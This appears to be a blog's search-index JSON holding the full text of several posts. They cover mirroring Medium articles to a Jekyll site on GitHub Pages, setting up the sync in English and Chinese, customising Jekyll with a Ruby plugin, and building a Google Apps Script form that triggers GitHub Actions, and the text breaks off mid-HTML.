[ { "title": "自動備份 Medium 文章到 Github Pages (Jekyll) 的那些事", "url": "/posts/5bb7d3a4954f/", "categories": "ZRealm Dev.", "tags": "medium, jekyll, automation, ios-app-development, github-pages", "date": "2025-01-18 23:12:33 +0800", "snippet": "自動備份 Medium 文章到 Github Pages (Jekyll) 的那些事個人 Medium 文章備份鏡像站搭建、維護、升級、客製化的一些紀錄前言經營 Medium 來到了第 6 年，文章總數在去年突破 100 篇；隨著經營時間越長、文章越多，越怕哪天 Medium 突然關閉或是帳號異常造成所有文章心血付之一炬，有的文章含金量不高道無妨，但更多的是記錄技術架構跟當時的解題思維，我時...", "content": "自動備份 Medium 文章到 Github Pages (Jekyll) 的那些事個人 Medium 文章備份鏡像站搭建、維護、升級、客製化的一些紀錄前言經營 Medium 來到了第 6 年，文章總數在去年突破 100 篇；隨著經營時間越長、文章越多，越怕哪天 Medium 突然關閉或是帳號異常造成所有文章心血付之一炬，有的文章含金量不高道無妨，但更多的是記錄技術架構跟當時的解題思維，我時常也會回來看之前寫的文章，重新複習知識；另外後面幾年也開始記錄出國旅遊遊記，都是回憶並且流量表現不錯；這些內容一但遺失就不可能再重新撰寫了。自行開發備份工具我習慣都是直接在 Medium 平台上撰寫文章，沒有自己的備份，因此在 2022 年過年期間花時間開發了一個 Medium 文章下載＆轉換成 Markdown 文件(包含文章圖片、文章內嵌的程式碼…等內容) 的工具 — ZMediumToMarkdown ：並延伸使用此工具將下載下來的 Markdown 使用 Jekyll (Chirpy Theme) 做為靜態備份鏡像網站部署在 Github Pages 上 — https://zhgchg.li/https://zhgchg.li/那時候把這整套整合成一個 Github Template Repo 給有同樣需求的朋友可以快速部署使用 — ZMediumToJekyll ，在此之後(2022)，我就沒有再更新過 Jekyll (Chirpy Theme) 的版本跟設定了； ZMediumToMarkdown 持續有在維護，偶爾會發現格式解析錯誤就會立刻修正，目前趨於穩定。那時候使用的 Jekyll (Chirpy Theme) 版本是 v5.x 沒有太大的問題，該有的功能也都有(e.g. 置頂、分類、標籤、封面圖、留言…)；只有在畫面滾動時很常會出現無法滾動問題，但是在滑個幾下又正常，一個操作體驗缺憾，曾經嘗試升級到 v6.x 還是有、回報給官方也沒得到回應；再加上隨著版本提升升級會遇到的衝突就越多，因此後來完全放棄升級這個念頭。近期才下定決心要解決 Jekyll (Chirpy Theme) 問題、升級版本、順手重新優化快速部署工具 ZMediumToJekyll 。New! medium-to-jekyll-starter 🎉🎉medium-to-jekyll-starter.github.io我將 Jekyll (Chirpy Theme) 最新版 v7.x 加上我的 ZMediumToMarkdown Medium 文章下載轉換工具重新整合成新的 — medium-to-jekyll-starter.github.io Github Template Repo。大家可以直接使用這個範本 Repo 快速設定搭建自己的 Medium 鏡像內容備份網站， 一次設定永久持續自動備份、部署在 Github Pages 上完全免費 。 手把手設定教學請參考此篇文章： https://zhgchg.li/posts/zh-TW-medium-to-jekyll/成果https://zhgchg.li/ *上面的所有文章都是 自動 從我的 Medium 下載所有內容＆轉換成 Markdown 格式＆重新上傳。 附上隨便一篇文章的轉換成果作為比較範例： Medium 上的原始內容 / 轉換後在個人網站的結果升級後沒再出現滾動卡住的問題了，藉由這次升級也多加上了客製化動態內容 (顯示 Medium 追蹤人數)。一些技術紀錄Jekyll (Chirpy Theme) 在 Github Pages 上的部署設定方式主要是直接參考官方 Start Repo： 上個月也參考這個專案的方式，做了一個新的開源專案 — Linkyee 開源版的 Link Tree 個人連結頁面。https://link.zhgchg.li/Jekyll 客製化方式 (1) — Override HTMLJekyll 是一套很強大的 Ruby 靜態內容網站生成引擎， Jekyll (Chirpy Theme) 只是一套基於 Jekyll 的主題，比較過其他主題還是 Chirpy Theme 最有質感跟操作體驗優異、功能俱全。Jekyll 的頁面具有繼承性，我們可以在 ./_layouts 新增 與 Jekyll 相同的頁面檔案名 ，引擎在產生網站內容時就會使用你自訂的頁面內容取代掉原本的。例如我希望在每個文章頁末尾加上一行文字，我先把原本的文章頁面檔案( post.html )複製出來，放到 ./_layouts 目錄下：使用編輯器打開 post.html 在相應的位置加上文字或客製化，重新部署網站就能看到客製化結果。也可以建立一個 ./_include 目錄，放一些想要共用的頁面內容檔案：然後再 post.html 中我們就可以直接使用 {% include buymeacoffee.html %} 引入剛檔案的 HTML 內容重複使用。 複寫 HTML Layout 檔案的優點是 100% 客製化，頁面內容、排版要怎麼呈現都可以隨意調整；缺點是這次在升級的過程就會遇到衝突或是預期外結果，要自己重新檢視一次客製化的內容。Jekyll 客製化方式 (2) — Plugin第二種方式是使用 Plugin 中的 Hook 方法，在 Jekyll 產生靜態內容階段注入自己想要的客製化內容。Built-in Hook Owners and EventsHook 事件 有很多，這邊只附上我用到的 site:pre_render 跟 post:pre_render新增方式也很簡單，只要在 ./_plugins 新增一個 Ruby 檔案即可。posts-lastmod-hook.rb 是原本就有的 Plugin我想要幾個「偽」動態內容功能，第一個是在個人資料下顯示 Medium 追蹤人數還有在頁底顯示頁面內容最後更新時間。在 ./_plugins 下建立了一個 zhgchgli-customize.rb ：#!/usr/bin/env ruby#require 'net/http'require 'nokogiri'require 'uri'require 'date'def load_medium_followers(url, limit = 10) return 0 if limit.zero? uri = URI(url) response = Net::HTTP.get_response(uri) case response when Net::HTTPSuccess then document = Nokogiri::HTML(response.body) follower_count_element = document.at('span.pw-follower-count &gt; a') follower_count = follower_count_element&amp;.text&amp;.split(' ')&amp;.first return follower_count || 0 when Net::HTTPRedirection then location = response['location'] return load_medium_followers(location, limit - 1) else return 0 endend$medium_url = \"https://medium.com/@zhgchgli\"# could also define in _config.yml and retrieve in Jekyll::Hooks.register :site, :pre_render do |site| site.config$medium_followers = load_medium_followers($medium_url)$medium_followers = 1000 if $medium_followers == 0$medium_followers = $medium_followers.to_s.reverse.scan(/\\d{1,3}/).join(',').reverseJekyll::Hooks.register :site, :pre_render do |site| tagline = site.config['tagline'] followMe = &lt;&lt;-HTML &lt;a href=\"#{$medium_url}\" target=\"_blank\" style=\"display: block;text-align: center;font-style: normal;/* text-decoration: underline; */font-size: 1.2em;color: var(--heading-color);\"&gt;#{$medium_followers}+ Followers on Medium&lt;/a&gt; HTML site.config['tagline'] = \"#{followMe}\"; site.config['tagline'] += tagline; meta_data = site.data.dig('locales', 'en', 'meta'); # only impletation in en, could impletation to all langs. if meta_data gmt_plus_8 = Time.now.getlocal(\"+08:00\") formatted_time = gmt_plus_8.strftime(\"%Y-%m-%d %H:%M:%S\") site.data['locales']['en']['meta'] += \"&lt;br/&gt;Last updated: #{formatted_time} +08:00\" endend 原理是註冊一個 Hook 在網站 Render 前，對 config 中的 tagline 個人資料下方介紹內容區塊，多塞上 Medium 追蹤人數顯示 HTML。 Medium 追蹤人數會在每次執行都去爬取拿到最新數字 頁底最後更新時間邏輯也差不多，就是對 locales-&gt;en-&gt;meta 在產生網站時多塞上最後更新時間字串 補充如果是 Hook 文章產生前，可以拿到 Markdown、Hook 文章產生後，可以拿到產生後的 HTML儲存後可以先在本機下 bundle exec jekyll s 測試結果：用瀏覽器打開 127.0.0.1:4000 查看結果。最後在 Github Pages Repo 上的 Actions 加上排程定時自動重新產生網站，就完成了：在 Jekyll (Chirpy Theme) Repo 專案中的 Actions 找到「 pages-deploy.yml 」在 on: 新增： schedule: - cron: \"10 1 * * *\" # 每天 UTC 01:10 自動執行一次, https://crontab.guru Plugin 的優點是可以達到動態內容效果(排程更新內容)、不影響網站架構不會在升級時遇到衝突；缺點就是能調整的內容、顯示位置有局限。Jekyll (Chirpy Theme) v7.x 後的 Github Pages 部署問題除了網站架構的調整外，v.7.x 的部署腳本也有改變；移除了原本的 deploy.sh 部署腳本，直接使用 Github Actions 的部署步驟：# build:# ... - name: Upload site artifact uses: actions/upload-pages-artifact@v3 with: path: \"_site${{ steps.pages.outputs.base_path }}\" deploy: environment: name: github-pages url: ${{ steps.deployment.outputs.page_url }} runs-on: ubuntu-latest needs: build steps: - name: Deploy to GitHub Pages id: deployment uses: actions/deploy-pages@v4但是我在部署的過程遇到了問題：Uploaded artifact size of 1737778940 bytes exceeds the allowed size of 1 GB 因為我的網站內容太大了，導致 Upload Artifact 失敗；但是之前的部署腳本是可以的，所以只好退回去用原本的 deploy.sh ＋ 註解掉上面這一段 。Github Pages 部署時 Test Site 步驟一直不通過Jekyll (Chirpy Theme) 部署有一個步驟是 Test Site 自檢測網頁內容是否正確，例如連結是否正常、HTML 標籤是否有缺漏…等等# build:# ... - name: Test site run: | bundle exec htmlproofer _site \\ \\-\\-disable-external \\ \\-\\-no-enforce-https \\ \\-\\-ignore-empty-alt \\ \\-\\-ignore-urls \"/^http:\\/\\/127.0.0.1/,/^http:\\/\\/0.0.0.0/,/^http:\\/\\/localhost/\"我自己多加了 --no-enforce-https --ignore-empty-alt 忽略 https、html tag沒有 alt 的檢查， 忽略這兩條讓檢查通過(因為暫時無法去改內容) 。htmlproofer 的 CLI 指令官方文件沒有提，翻了好久才在某個 Issue 的 Comment 找到規則：https://github.com/gjtorikian/html-proofer/issues/727#issuecomment-1334430268其他文章補充 Github Pages 自訂網域教學 Linkyee — 使用 GitHub Pages 快速免費建立個人類 LinkTree 連結頁面有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 45 Total Views Last Statistics Date: 2025-01-19 | 6 Views on Medium. " }, { "title": "[正體中文] Medium to Jekyll 安裝設定教學", "url": "/posts/zh-TW-medium-to-jekyll/", "categories": "tools", "tags": "meidum, github, jekyll, ruby", "date": "2025-01-17 08:00:00 +0800", "snippet": " 简体中文 正體中文 English Start!1. 前往 Template Repo -&gt; medium-to-jekyll-starter.github.io點擊右上角「Use this template」-&gt;「Create a new repository」2. Create a new repository Repo...", "content": " 简体中文 正體中文 English Start!1. 前往 Template Repo -&gt; medium-to-jekyll-starter.github.io點擊右上角「Use this template」-&gt;「Create a new repository」2. Create a new repository Repository name: 通常為 帳號或組織名稱.github.io，必須以 *.github.io 為結尾。 必須為 Public Repo 才能使用 Github Pages3. Create gh-pages branch if needed 在 Repo 主頁點擊「main」分支選單，輸入「gh-pages」，若無則選擇「Create branch gh-pages from main」 若 gh-pages 分支已存在、或建立時出現「Sorry, that branch already exists.」則可跳過此步驟4. Enable Github Pages，前往 Settings -&gt; Pages -&gt; Build and deployment 選擇「gh-pages」分支，點擊「Save」儲存設定5. 等待所有部署工作完成 🟢 pages build and deployment 🟢 Build and Deploy6. 前往網站查看結果 https://帳號或組織名稱.github.io成功！🎉🎉🎉Github Repo (Github Actions) 設定1. 前往所屬 Github Repo 的 Github Actions 頁面 -&gt; 點擊「ZMediumToMarkdown」-&gt; 點擊「ZMediumToMarkdown.yml」 https://github.com/{ORG}/{REPO_NAME}/blob/main/.github/workflows/ZMediumToMarkdown.yml 2. 點擊右方編輯按鈕 3. 設定 Medium 文章自動同步參數name: ZMediumToMarkdownon: workflow_dispatch: schedule: - cron: \"10 1 15 * *\" # Runs at 01:10(UTC), everyday. # 設定排程多久自動同步一次 # ref: https://crontab.guru/jobs: ZMediumToMarkdown: runs-on: ubuntu-latest steps: - name: ZMediumToMarkdown Automatic Bot uses: ZhgChgLi/ZMediumToMarkdown@main with: command: \"--cookie_uid ${{ secrets.MEDIUM_COOKIE_UID }} --cookie_sid ${{ secrets.MEDIUM_COOKIE_SID }} -j zhgchgli_test\" # zhgchgli_test 替換成你的 Meidum 使用者 # 例如 https://medium.com/@zhgchgli -&gt; zhgchgli # ref: https://github.com/ZhgChgLi/ZMediumToMarkdown?tab=readme-ov-file#usage有付費牆文章，需提供有存取權限的 Medium 帳號 Cookies。 (作者本人 or Medium Member)取得 Meidum 帳號 Cookies MEDIUM_COOKIE_UID &amp; MEDIUM_COOKIE_SID 步驟： 登入擁有存取權限的 Medium 帳號，進入 Medium 後台 在空白處點擊右鍵 選擇「Inspect」 出現 Developer Console 後選擇「Application」 選擇「Cookies」-&gt;「https://medium.com」 往下滾動找到「sid」「uid」 點兩下複製這兩個欄位的值將 Meidum 帳號 Cookies 安全存放在 Github Repo Secrets1. 前往 Github Repo Settings -&gt; Secrets and variables -&gt; Actions -&gt; New repository secret https://github.com/{ORG}/{REPO_NAME}/settings/secrets/actions/new 2. New secret - MEDIUM_COOKIE_SID Name: MEDIUM_COOKIE_SID Secret: 貼上上一步複製的 Medium 帳號 sid 值 3. New secret - MEDIUM_COOKIE_UID Name: MEDIUM_COOKIE_UID Secret: 貼上上一步複製的 Medium 帳號 uid 值 完成帳號無特別登出或遇到問題，Cookies 不會失效。如果在同步中出現以下訊息並且同步的文章不完整：This post is behind Medium's paywall. You must provide valid Medium Member login cookies to download the full post.代表 Cookies 已失效，請重新照上述步驟重新設定。4. 首次手動同步，Repo -&gt; Github Actions -&gt; 點擊「ZMediumToMarkdown」-&gt; 點擊「Enable workflow」初次執行，我們可以自己手動同步一次檢查設定是否正確。5. 等待同步文章與網站部署工作完成等待以下三個 Actions 工作執行完成並且沒有錯誤： 🟢 ZMediumToMarkdown 🟢 pages build and deployment 🟢 Build and Deploy6. 重整網頁查看結果，Enjoy! ⚠️ 請注意！所有檔案變更都會觸發： 🟢 pages build and deployment 🟢 Build and Deploy 需等待以上兩個部署工作完成，網站更改才會生效。Jekyll 網站設定網站基本設定 ./_config.yml 分享功能設定：./_data/share.yml 定義文章作者資訊：./_data/authors.yml左側 Sidebar 設定 ./tabs 底部連結按鈕：./_data/contact.yml網站底部及其他文字內容設定 ./locales/{Lang}.yml default is /locales/en.yml本地測試 確定你的環境有安裝並使用 Ruby &gt;= 3.1 版本 cd ./ bundle install bundle exec jekyll s Go to http://127.0.0.1:4000/ 查看結果 Press Ctrl-c to stop.*網站基本設定檔案有調整需要重新執行才會生效。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers" }, { "title": "[简体中文] Medium to Jekyll 安装设定教学", "url": "/posts/zh-CN-medium-to-jekyll/", "categories": "tools", "tags": "meidum, github, jekyll, ruby", "date": "2025-01-17 08:00:00 +0800", "snippet": " 简体中文 正體中文 English Start!1. 前往 Template Repo -&gt; medium-to-jekyll-starter.github.io点击右上角「Use this template」-&gt;「Create a new repository」2. Create a new repository Repo...", "content": " 简体中文 正體中文 English Start!1. 前往 Template Repo -&gt; medium-to-jekyll-starter.github.io点击右上角「Use this template」-&gt;「Create a new repository」2. Create a new repository Repository name: 通常为 帐号或组织名称.github.io，必须以 *.github.io 为结尾。 必须为 Public Repo 才能使用 Github Pages3. Create gh-pages branch if needed 在 Repo 主页点击「main」分支选单，输入「gh-pages」，若无则选择「Create branch gh-pages from main」 若 gh-pages 分支已存在、或建立时出现「Sorry, that branch already exists.」则可跳过此步骤4. Enable Github Pages，前往 Settings -&gt; Pages -&gt; Build and deployment 选择「gh-pages」分支，点击「Save」储存设定5. 等待所有部署工作完成 🟢 pages build and deployment 🟢 Build and Deploy6. 前往网站查看结果 https://帐号或组织名称.github.io成功！🎉🎉🎉Github Repo (Github Actions) 设定1. 前往所属 Github Repo 的 Github Actions 页面 -&gt; 点击「ZMediumToMarkdown」-&gt; 点击「ZMediumToMarkdown.yml」 https://github.com/{ORG}/{REPO_NAME}/blob/main/.github/workflows/ZMediumToMarkdown.yml 2. 点击右方编辑按钮 3. 设定 Medium 文章自动同步参数name: ZMediumToMarkdownon: workflow_dispatch: schedule: - cron: \"10 1 15 * *\" # Runs at 01:10(UTC), everyday. # 设定排程多久自动同步一次 # ref: https://crontab.guru/jobs: ZMediumToMarkdown: runs-on: ubuntu-latest steps: - name: ZMediumToMarkdown Automatic Bot uses: ZhgChgLi/ZMediumToMarkdown@main with: command: \"--cookie_uid ${{ secrets.MEDIUM_COOKIE_UID }} --cookie_sid ${{ secrets.MEDIUM_COOKIE_SID }} -j zhgchgli_test\" # zhgchgli_test 替换成你的 Meidum 使用者 # 例如 https://medium.com/@zhgchgli -&gt; zhgchgli # ref: https://github.com/ZhgChgLi/ZMediumToMarkdown?tab=readme-ov-file#usage有付费墙文章，需提供有存取权限的 Medium 帐号 Cookies。 (作者本人 or Medium Member)取得 Meidum 帐号 Cookies MEDIUM_COOKIE_UID &amp; MEDIUM_COOKIE_SID 步骤： 登入拥有存取权限的 Medium 帐号，进入 Medium 后台 在空白处点击右键 选择「Inspect」 出现 Developer Console 后选择「Application」 选择「Cookies」-&gt;「https://medium.com」 往下滚动找到「sid」「uid」 点两下复制这两个栏位的值将 Meidum 帐号 Cookies 安全存放在 Github Repo Secrets1. 前往 Github Repo Settings -&gt; Secrets and variables -&gt; Actions -&gt; New repository secret https://github.com/{ORG}/{REPO_NAME}/settings/secrets/actions/new 2. New secret - MEDIUM_COOKIE_SID Name: MEDIUM_COOKIE_SID Secret: 贴上上一步复制的 Medium 帐号 sid 值 3. New secret - MEDIUM_COOKIE_UID Name: MEDIUM_COOKIE_UID Secret: 贴上上一步复制的 Medium 帐号 uid 值 完成帐号无特别登出或遇到问题，Cookies 不会失效。如果在同步中出现以下讯息并且同步的文章不完整：This post is behind Medium's paywall. You must provide valid Medium Member login cookies to download the full post.代表 Cookies 已失效，请重新照上述步骤重新设定。4. 首次手动同步，Repo -&gt; Github Actions -&gt; 点击「ZMediumToMarkdown」-&gt; 点击「Enable workflow」初次执行，我们可以自己手动同步一次检查设定是否正确。5. 等待同步文章与网站部署工作完成等待以下三个 Actions 工作执行完成并且没有错误： 🟢 ZMediumToMarkdown 🟢 pages build and deployment 🟢 Build and Deploy6. 重整网页查看结果，Enjoy! ⚠️ 请注意！所有档案变更都会触发： 🟢 pages build and deployment 🟢 Build and Deploy 需等待以上两个部署工作完成，网站更改才会生效。Jekyll 网站设定网站基本设定 ./_config.yml 分享功能设定：./_data/share.yml 定义文章作者资讯：./_data/authors.yml左侧 Sidebar 设定 ./tabs 底部连结按钮：./_data/contact.yml网站底部及其他文字内容设定 ./locales/{Lang}.yml default is /locales/en.yml本地测试 确定你的环境有安装并使用 Ruby &gt;= 3.1 版本 cd ./ bundle install bundle exec jekyll s Go to http://127.0.0.1:4000/ 查看结果 Press Ctrl-c to stop.*网站基本设定档案有调整需要重新执行才会生效。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers" }, { "title": "[English] Medium to Jekyll Installation and Configuration Guide", "url": "/posts/en-medium-to-jekyll/", "categories": "tools", "tags": "medium, github, jekyll, ruby", "date": "2025-01-17 08:00:00 +0800", "snippet": " 简体中文 正體中文 English Start!1. Go to Template Repo -&gt; medium-to-jekyll-starter.github.ioClick “Use this template” in the upper right corner -&gt; “Create a new repository”...", "content": " 简体中文 正體中文 English Start!1. Go to Template Repo -&gt; medium-to-jekyll-starter.github.ioClick “Use this template” in the upper right corner -&gt; “Create a new repository”2. Create a new repository Repository name: Usually account or organization name.github.io, must end with *.github.io. Must be a Public Repo to use Github Pages3. Create gh-pages branch if needed On the Repo homepage, click the “main” branch dropdown, enter “gh-pages”, if it does not exist, select “Create branch gh-pages from main” If the gh-pages branch already exists, or if you see “Sorry, that branch already exists.” when creating, you can skip this step4. Enable Github Pages, go to Settings -&gt; Pages -&gt; Build and deployment Select the “gh-pages” branch, click “Save” to save the settings5. Wait for all deployment work to complete 🟢 pages build and deployment 🟢 Build and Deploy6. Go to the website to check the results https://account_or_organization_name.github.ioSuccess! 🎉🎉🎉Github Repo (Github Actions) Setup1. Go to the Github Actions page of your Github Repo -&gt; Click on “ZMediumToMarkdown” -&gt; Click on “ZMediumToMarkdown.yml” https://github.com/{ORG}/{REPO_NAME}/blob/main/.github/workflows/ZMediumToMarkdown.yml 2. Click the edit button on the right 3. Set up the parameters for automatic synchronization of Medium articlesname: ZMediumToMarkdownon: workflow_dispatch: schedule: - cron: \"10 1 15 * *\" # Runs at 01:10 (UTC) on the 15th of every month. # Schedule to automatically sync at specified intervals # Reference: https://crontab.guru/jobs: ZMediumToMarkdown: runs-on: ubuntu-latest steps: - name: ZMediumToMarkdown Automatic Bot uses: ZhgChgLi/ZMediumToMarkdown@main with: command: \"--cookie_uid ${{ secrets.MEDIUM_COOKIE_UID }} --cookie_sid ${{ secrets.MEDIUM_COOKIE_SID }} -j zhgchgli_test\" # Replace 'zhgchgli_test' with your Medium username # For example, https://medium.com/@zhgchgli -&gt; zhgchgli # Reference: https://github.com/ZhgChgLi/ZMediumToMarkdown?tab=readme-ov-file#usagePaywall posts require a Medium account with access permissions and cookies. (Author or Medium Member)Steps to obtain Medium account cookies MEDIUM_COOKIE_UID &amp; MEDIUM_COOKIE_SID: Log in to a Medium account with access permissions and go to the Medium Dashboard Right-click in a blank area Select “Inspect” Once the Developer Console appears, select “Application” Choose “Cookies” -&gt; “https://medium.com” Scroll down to find “sid” and “uid” Double-click to copy the values of these two fieldsSafely store Medium account cookies in GitHub Repo Secrets1. Go to GitHub Repo Settings -&gt; Secrets and variables -&gt; Actions -&gt; New repository secret https://github.com/{ORG}/{REPO_NAME}/settings/secrets/actions/new 2. New secret - MEDIUM_COOKIE_SID Name: MEDIUM_COOKIE_SID Secret: Paste the sid value copied from the previous step 3. New secret - MEDIUM_COOKIE_UID Name: MEDIUM_COOKIE_UID Secret: Paste the uid value copied from the previous step CompletionIf there is no special logout or issues, the cookies will not expire.If the following message appears during synchronization and the articles are incomplete:This post is behind Medium's paywall. You must provide valid Medium Member login cookies to download the full post.It means the cookies have expired; please reset them by following the steps above.4. First manual synchronization, Repo -&gt; GitHub Actions -&gt; Click “ZMediumToMarkdown” -&gt; Click “Enable workflow”On the first run, we can manually synchronize once to check if the settings are correct.5. Wait for the synchronization of articles and website deployment to complete.Wait for the following three Actions to complete without errors: 🟢 ZMediumToMarkdown 🟢 pages build and deployment 🟢 Build and Deploy6. Refresh the webpage to see the results, Enjoy! ⚠️ Please note! All file changes will trigger: 🟢 pages build and deployment 🟢 Build and Deploy You need to wait for the above two deployment tasks to complete for the website changes to take effect.Jekyll Website ConfigurationBasic Website Settings ./_config.yml Share feature settings: ./_data/share.yml Define author information for articles: ./_data/authors.ymlLeft Sidebar Settings ./tabs Bottom link buttons: ./_data/contact.ymlWebsite Footer and Other Text Content Settings ./locales/{Lang}.yml default is /locales/en.ymlLocal Testing Ensure your environment has Ruby &gt;= 3.1 installed and in use. cd ./ bundle install bundle exec jekyll s Go to http://127.0.0.1:4000/ to see the results. Press Ctrl-c to stop.Adjustments to the basic website configuration file require re-execution to take effect.===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers" }, { "title": "使用 Google Apps Script Web App 表單串接 Github Action CI/CD 工作", "url": "/posts/4cb4437818f2/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-apps-script, github-actions, slack, github", "date": "2025-01-11 19:19:43 +0800", "snippet": "使用 Google Apps Script Web App 表單串接 Github Action CI/CD 工作Github Action Workflow 表單優化與整合其他工作流程工具(Jira, Asana, Slack. . )提升開發效率。左：原始的 Github Action Workflow Form / 右： 最終成果 (GAS Web App Form)背景之前的團隊使用...", "content": "使用 Google Apps Script Web App 表單串接 Github Action CI/CD 工作Github Action Workflow 表單優化與整合其他工作流程工具(Jira, Asana, Slack. . )提升開發效率。左：原始的 Github Action Workflow Form / 右： 最終成果 (GAS Web App Form)背景之前的團隊使用 Github Action &amp; Self-hosted Github Runner + Slack 搭建整套 CI/CD 服務；整體效果不錯，對於 App 開發者來說建置與維護相對容易，只需照著官方文件提供的 YAML 參數完成設定就會自動觸發、機器方面也可以輕易的使用自己的機器當成 Runner 使用，服務本身都是由 Github 維護，我們不需在意版本升級等問題並且 Runner 是反向跟 Github 要任務下來做，不需要特別開對外網路開口；對團隊更好的事是，使用自己的 Runner 跑 Github Action 是完全免費的。 等於同時享受到類似 Bitrise 的 GUI YAML 建置方式又有像 Jenkins 那樣使用自架機器的彈性跟較低的建置成本，但不用像 Jenkins 那樣需要花時間維護服務本身。 未來有時間再寫一篇完整的 App CI/CD x Github Action 搭建過程。問題：Github Action CI/CD GUI FormGithub Action GUI Form 在 App 開發中，在 CD 觸發打包測試版、正式版或送審時通常會需要提供一些外部參數或是依照需求選擇環境、分支，才會開始執行工作。不同於 Jenkins 是自建服務，有完整的 Web GUI；Github Action 沒有，唯一的 Web GUI Form 是在 Actions 中點擊 Run workflow 可以自訂一個簡易的表單供使用者輸入外部參數，然後觸發 CI/CD 工作流程。通常會使用這個 CD 打包的使用者，不一定是 App 開發者本身、也不一定擁有這個專案的權限；例如 QA 需要打包指定版本、PM/Backend 需要打包某個開發中版本進行測試；Github Action Form 需要有該專案的權限才能使用，但使用者不要說能不能有專案權限、甚至是不一定有工程背景。而且我們無法在這邊做動態表單或資料驗證。 因此我們需要另外拉一個 GUI 服務給其他使用者操作使用。自建 Slack App 解決之前團隊是有熱愛做自動化的同仁自己用 Kotlin+Ktor 搭建了一個完整的 Slack App 網路服務，串接 Slack 訊息、表單、指令…等功能，接收、轉發 CD 打包請求，觸發 Github Action 執行操作並將結果串回 Slack。 目前沒有開發資源跟之前一樣使用 Kotlin+Ktor 建置服務自己寫 Web/iOS/macOS App 工具目前團隊原本是使用 Jenkins 有基礎的 Web 可以給其他使用者登入使用、另外還有自行開發了一個 App 串接 Jenkins 封裝一些參數讓非工程背景的使用者更方便使用。 不過遷移到 Github Action 之後這整套就廢棄了。❌ Private Github Pages應該有機會直接建置 Github Pages 來當 CI/CD Web GUI，但是目前只有 Github Enterprise 可以設定 Github Pages 存取權限，其他方案就算是 Private Repo 也會是公開的；無安全性可言。❌ Slack App，但使用 Google Apps Script 建置一開始想說依照之前團隊的經驗使用 Slack App 做為 CI/CD GUI Form 服務，但是目前沒有資源跟之前一樣使用 Kotlin+Ktor 建置服務；所以想說先使用 Function as a Service 服務快速嘗試建置。Function as a Service 有很多種， Cloud Functions 的自由度比較高，但由於組織 IT 限制，無法隨意新增 Public Cloud Functions 並且有收費問題；因此還是回到我們的老朋友 — Google Apps Script。 之前寫過好幾篇關於 Google Apps Script 做自動化的文章，有興趣的朋友可以參考： 1. 「 使用 Google Apps Script 實現每日數據報表 RPA 自動化 」 2. 「 簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人 」 3. 「 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 」 4. 「 Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 」總而言之，Google Apps Script 是 Google 另一個 Function as a Service 服務，主要特色是免費跟與 Google 服務之間可以快速整合；但是限制也較多，例如只能用它的語言、執行時間不能超過 6 分鐘、有執行次數上限、不支援多執行緒…等等，細節可以參考 我之前的文章 。結論是不可行，原因是： Function as a Service 冷啟動問題 。服務一段時間沒呼叫會進入睡眠，再次呼叫要花較長時間啟動(3~≥ 5 秒)； Slack App 對於 API 響應時間非常嚴格，服務需要在 3 秒內回應否則視為失敗 ，Slack 這邊就會直接噴錯誤、事件監聽也會被認為丟失，導致重複發送。 Google Apps Script doGet, doPost 方法無法取得 Headers。 這會導致無法走 官方的安全驗證 、無法關閉 Slack Retry 。 Google Apps Script 單執行緒問題。如果要串接其他服務響應時間都會超過 3 秒，直接被 Slack 判定為失敗。有勉強使用 Slack 訊息、Block Kit、Form 串接完整個流程，但是太容易觸發上述問題，後來直接放棄。 如果要做這套還是要走自己起伺服器、服務，不要走 Function as a Service! !❌ Slack Workflow FormSlack Workflow Form (❌ 無法客制化)另外也嘗試過 Slack 內建的自動化功能 Workflow Form，不過他無法做到動態表單內容 (e.g. 撈分支讓使用者選)，唯一能客製化的只有後續送資料的步驟。✅ Google Apps Script Web App GUI Form 表單山不轉路轉，轉念一想好像也不用糾結在一定要用 Slack 整合上，用 Slack 整合是最好的方案，因為是直接整進既有的團隊協作工具，不需要發散額外去學新工具；但是迫於資源限制，我們只能退而求其次找其他穩定又好用的方法。 回頭想到 Google Apps Script 本身就能部署成 Web App，可以在 Web doGet 時回應 GUI Form 表單，送出表單後觸發後續的 Github 串接處理。最終成果 🎉Demo Web App Form工作流程我們使用 Google Apps Script Web App 建置 CI/CD 表單，直接綁定 Google Workspace 帳號，設定只有組織內的使用者可以存取；自動獲取當前登入的使用者信箱、使用 Github Repo 共用帳號(或借用某個有權限的帳號)的 Personal Access Token 打 Github API 獲得分支列表，送出後同樣打 API 觸發 Github Action 開始執行 CI/CD 工作。另外，我們可以用使用者的信箱透過 Slack App 去打 Slack API，取得該使用者的 Slack ID，再透過 Slack App 傳送訊息，通知 CI/CD 任務執行情況。也可以再與其他工具、開發流程進行整合，例如先從 Asana, Jira 取得工單，選擇後再透過 Github API 查找分支、觸發 Github Action，最後再透過 Slack 通知給使用者。Step 1. 建立 Google Apps Script Web App Form前往 &gt; Google Apps Script ，新增專案。Step 2. 建立表單內容、GAS 程式太久沒有寫 HTML,CSS 也懶得自己設計樣式，直接請 ChatGPT 產一個有一點設計的 HTML 表單範本。在 GAS 左方檔案列表點「+」新增檔案，輸入檔案名稱「 Form.html 」並把 GPT 產的 HTML 表單範本內容貼上。Form.html：&lt;!--HTML &amp; Style Gen by ChatGPT 4o--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;&lt;?=title?&gt;&lt;/title&gt; &lt;style&gt; body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f7f7f7; } .form-container { max-width: 600px; margin: auto; padding: 20px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); } .form-container h2 { margin-bottom: 20px; color: #333333; } .form-group { margin-bottom: 15px; } .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #555555; } .form-group input, .form-group select, .form-group textarea { width: 95%; padding: 10px; border: 1px solid #cccccc; border-radius: 4px; font-size: 16px; } .form-group input[type=\"radio\"] { width: auto; margin-right: 10px; } .form-group .radio-label { display: inline-block; margin-right: 